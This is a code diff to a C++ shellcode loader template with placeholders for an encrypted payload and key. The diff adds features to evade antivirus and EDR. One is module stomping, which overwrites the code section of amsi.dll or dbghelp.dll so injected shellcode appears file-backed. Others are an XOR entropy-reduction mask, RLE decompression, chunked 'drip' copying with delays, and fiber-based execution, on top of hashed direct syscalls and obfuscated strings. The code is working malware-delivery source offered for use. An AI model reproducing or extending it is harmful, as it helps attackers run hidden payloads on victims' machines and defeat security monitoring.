@@ -15,6 +15,11 @@
 // Encrypted payload
 {{ENCRYPTED_PAYLOAD}}
 
+{{#IF ENTROPY_REDUCE}}
+// Entropy reduction mask
+{{ENTROPY_MASK}}
+{{#ENDIF}}
+
 // Encryption key
 {{KEY_DATA}}
 
@@ -40,6 +45,11 @@ static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
 
 {{#IF LOCAL_INJECT}}
 static void execute_local() {
+{{#IF ENTROPY_REDUCE}}
+    for (size_t i = 0; i < payload_len; i++)
+        payload[i] ^= entropy_mask[i];
+{{#ENDIF}}
+
     // Decode if needed
     uint8_t* encrypted = nullptr;
     size_t encrypted_len = 0;
@@ -99,15 +109,81 @@ static void execute_local() {
     shellcode = decompressed;
     shellcode_len = decompressed_len;
 {{#ENDIF}}
+{{#IF COMPRESS_RLE}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_rle(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
 
 {{#IF SLEEP_IN_BETWEEN}}
     evasion_sleep({{SLEEP_IN_BETWEEN_SECONDS}});
 {{#ENDIF}}
 
-    // Allocate memory via syscall
+    HANDLE hProc = GetCurrentProcess();
+    PVOID exec_addr = nullptr;
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (!NtPVM) return;
+
+{{#IF MODULE_STOMP}}
+    // Module Stomping: load a sacrificial DLL, overwrite its .text section
+    // Makes shellcode memory appear file-backed (evades unbacked-memory scanners)
+    HMODULE hSacrifice = LoadLibraryW(obf_wide(L"amsi.dll"));
+    if (!hSacrifice) hSacrifice = LoadLibraryW(obf_wide(L"dbghelp.dll"));
+    if (!hSacrifice) return;
+
+    auto s_dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hSacrifice);
+    auto s_nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(hSacrifice) + s_dos->e_lfanew);
+    auto s_sec = IMAGE_FIRST_SECTION(s_nt);
+
+    BYTE* stomp_addr = nullptr;
+    SIZE_T stomp_size = 0;
+    for (WORD si = 0; si < s_nt->FileHeader.NumberOfSections; si++) {
+        if ((s_sec[si].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+            s_sec[si].Misc.VirtualSize >= shellcode_len) {
+            stomp_addr = reinterpret_cast<BYTE*>(hSacrifice) + s_sec[si].VirtualAddress;
+            stomp_size = s_sec[si].Misc.VirtualSize;
+            break;
+        }
+    }
+    if (!stomp_addr) return;
+
+    {
+        PVOID pa = stomp_addr;
+        SIZE_T ps = stomp_size;
+        ULONG op;
+        NtPVM(hProc, &pa, &ps, PAGE_READWRITE, &op);
+
+{{#IF DRIP_LOAD}}
+        SIZE_T drip_size = 4096;
+        for (SIZE_T offset = 0; offset < shellcode_len; offset += drip_size) {
+            SIZE_T chunk = (shellcode_len - offset < drip_size) ? shellcode_len - offset : drip_size;
+            memcpy(stomp_addr + offset, shellcode + offset, chunk);
+            if (offset + drip_size < shellcode_len) {
+                LARGE_INTEGER dw;
+                dw.QuadPart = -10000LL * (50 + (offset % 100));
+                auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
+                if (NtDE) NtDE(FALSE, &dw);
+            }
+        }
+{{#ENDIF}}
+{{#IF STANDARD_COPY}}
+        memcpy(stomp_addr, shellcode, shellcode_len);
+{{#ENDIF}}
+
+        exec_addr = stomp_addr;
+        pa = stomp_addr;
+        ps = stomp_size;
+        NtPVM(hProc, &pa, &ps, op, &op);
+    }
+{{#ENDIF}}
+
+{{#IF STANDARD_ALLOC}}
     PVOID base_addr = nullptr;
     SIZE_T region_size = shellcode_len;
-    HANDLE hProc = GetCurrentProcess();
 
     auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
     if (!NtAVM) return;
@@ -116,47 +192,90 @@ static void execute_local() {
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0) return;
 
-    // Copy shellcode
-    PVOID exec_addr = base_addr;
+{{#IF DRIP_LOAD}}
+    {
+        SIZE_T drip_sz = 4096;
+        for (SIZE_T off = 0; off < shellcode_len; off += drip_sz) {
+            SIZE_T ch = (shellcode_len - off < drip_sz) ? shellcode_len - off : drip_sz;
+            memcpy(reinterpret_cast<BYTE*>(base_addr) + off, shellcode + off, ch);
+            if (off + drip_sz < shellcode_len) {
+                LARGE_INTEGER dw;
+                dw.QuadPart = -10000LL * (50 + (off % 100));
+                auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
+                if (NtDE) NtDE(FALSE, &dw);
+            }
+        }
+    }
+{{#ENDIF}}
+    exec_addr = base_addr;
+{{#IF STANDARD_COPY}}
     memcpy(base_addr, shellcode, shellcode_len);
+{{#ENDIF}}
 
-    // Change to RX (NtProtectVirtualMemory may mutate base_addr/region_size)
-    ULONG old_prot;
-    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
-    if (!NtPVM) return;
-    NtPVM(hProc, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_prot);
+    {
+        ULONG old_prot;
+        NtPVM(hProc, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_prot);
+    }
+{{#ENDIF}}
 
 {{#IF EXEC_DIRECT}}
-    // Direct execution
     auto fn = reinterpret_cast<void(*)()>(exec_addr);
     fn();
 {{#ENDIF}}
 
 {{#IF EXEC_THREAD}}
-    // NtCreateThreadEx
-    HANDLE hThread = nullptr;
-    auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
-    if (!NtCTE) return;
-    NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, exec_addr,
-          NULL, 0, 0, 0, 0, NULL);
-    if (hThread) {
-        auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
-        if (NtWFSO) NtWFSO(hThread, FALSE, NULL);
+    {
+        HANDLE hThread = nullptr;
+        auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
+        if (!NtCTE) return;
+        NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, exec_addr,
+              NULL, 0, 0, 0, 0, NULL);
+        if (hThread) {
+            auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
+            if (NtWFSO) NtWFSO(hThread, FALSE, NULL);
+        }
     }
 {{#ENDIF}}
 
 {{#IF EXEC_APC}}
-    // NtQueueApcThread - queue to current thread, then alertable wait
-    auto NtQAT = get_syscall_fn<NtQueueApcThread_t>(HASH_NtQueueApcThread);
-    if (!NtQAT) return;
-    NtQAT(GetCurrentThread(), exec_addr, NULL, NULL, NULL);
-    // Trigger APC delivery
-    SleepEx(INFINITE, TRUE);
+    {
+        auto NtQAT = get_syscall_fn<NtQueueApcThread_t>(HASH_NtQueueApcThread);
+        if (!NtQAT) return;
+        NtQAT(GetCurrentThread(), exec_addr, NULL, NULL, NULL);
+        SleepEx(INFINITE, TRUE);
+    }
 {{#ENDIF}}
 
 {{#IF EXEC_CALLBACK}}
-    // Callback execution via EnumWindows
     EnumWindows(reinterpret_cast<WNDENUMPROC>(exec_addr), 0);
+{{#ENDIF}}
+
+{{#IF EXEC_FIBER}}
+    {
+        // CaroKann: fiber-based execution
+        using ConvertThreadToFiber_t = LPVOID(WINAPI*)(LPVOID);
+        using CreateFiber_t = LPVOID(WINAPI*)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
+        using SwitchToFiber_t = void(WINAPI*)(LPVOID);
+        using ConvertFiberToThread_t = BOOL(WINAPI*)();
+
+        HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
+        auto pCTF = reinterpret_cast<ConvertThreadToFiber_t>(
+            GetProcAddress(hK32, obf("ConvertThreadToFiber")));
+        auto pCF = reinterpret_cast<CreateFiber_t>(
+            GetProcAddress(hK32, obf("CreateFiber")));
+        auto pSF = reinterpret_cast<SwitchToFiber_t>(
+            GetProcAddress(hK32, obf("SwitchToFiber")));
+        auto pCFT = reinterpret_cast<ConvertFiberToThread_t>(
+            GetProcAddress(hK32, obf("ConvertFiberToThread")));
+        if (!pCTF || !pCF || !pSF) return;
+
+        LPVOID mainFiber = pCTF(NULL);
+        if (!mainFiber) return;
+        LPVOID scFiber = pCF(0, reinterpret_cast<LPFIBER_START_ROUTINE>(exec_addr), NULL);
+        if (!scFiber) return;
+        pSF(scFiber);
+        if (pCFT) pCFT();
+    }
 {{#ENDIF}}
 
     // Zero shellcode from stack
@@ -165,6 +284,9 @@ static void execute_local() {
     SecureZeroMemory(decompressed, sizeof(decompressed));
 {{#ENDIF}}
 {{#IF COMPRESS_LZ4}}
+    SecureZeroMemory(decompressed, sizeof(decompressed));
+{{#ENDIF}}
+{{#IF COMPRESS_RLE}}
     SecureZeroMemory(decompressed, sizeof(decompressed));
 {{#ENDIF}}
 }
